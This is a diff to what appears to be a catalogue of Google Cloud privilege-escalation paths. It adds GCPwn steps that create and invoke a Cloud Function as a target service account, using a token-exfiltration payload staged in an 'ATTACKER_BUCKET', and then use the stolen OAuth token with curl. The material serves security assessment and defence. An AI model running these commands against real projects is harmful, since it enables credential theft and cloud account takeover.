@@ -163,6 +163,23 @@ exploitationSteps:
       curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
         "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
     description: Invoke the function using `run.routes.invoke`, extract the attached service account's token from the response, and use it directly against Google APIs
+  gcpwn:
+  - step: 1
+    command: |
+      modules run exploit_cloudfunctions_function_as_sa \
+        --function-name projects/PROJECT_ID/locations/REGION/functions/FUNCTION_NAME \
+        --target-sa TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --v2 \
+        --create \
+        --invoke \
+        --source-uri gs://ATTACKER_BUCKET/function-exfil.zip
+    description: Use Scott Weston and NetSPI's GCPwn Cloud Functions module to create and invoke a second-generation function as the target service account. `function-exfil.zip` must be a pre-staged GCPwn-compatible token-exfiltration payload that the Cloud Functions build process can read; staging it may require separate Cloud Storage access outside this path's required permission set.
+  - step: 2
+    command: |
+      EXFILTRATED_TOKEN="TOKEN_RECOVERED_BY_GCPWN"
+      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Use the OAuth token recovered by GCPwn directly against Google APIs as the attached service account
 recommendation: |
   High powered service accounts + overly broad `iam.serviceAccounts.actAs` is what makes this privilege escalation path exploitable and impactful.
 
@@ -204,6 +221,10 @@ references:
   url: https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py
 - title: GCP - Cloud Run Functions Privilege Escalation - HackTricks Cloud
   url: https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-cloudfunctions-privesc.html
+- title: GCPwn Cloud Functions service account exploitation module - Scott Weston / NetSPI
+  url: https://github.com/NetSPI/gcpwn/blob/acabc59d87fdc5dca86d919aa72faf7a628e2e9a/gcpwn/modules/gcp/cloudfunctions/exploit/exploit_cloudfunctions_function_as_sa.py
+- title: GCPwn OpenGraph Cloud Functions privilege-escalation edges - Scott Weston / NetSPI
+  url: https://github.com/NetSPI/gcpwn/blob/acabc59d87fdc5dca86d919aa72faf7a628e2e9a/gcpwn/mappings/og_defined_edges.json#L688-L748
 - title: Cloud Run functions IAM roles - Google Cloud
   url: https://cloud.google.com/functions/docs/reference/iam/roles
 - title: Authenticate for invocation - Cloud Run functions
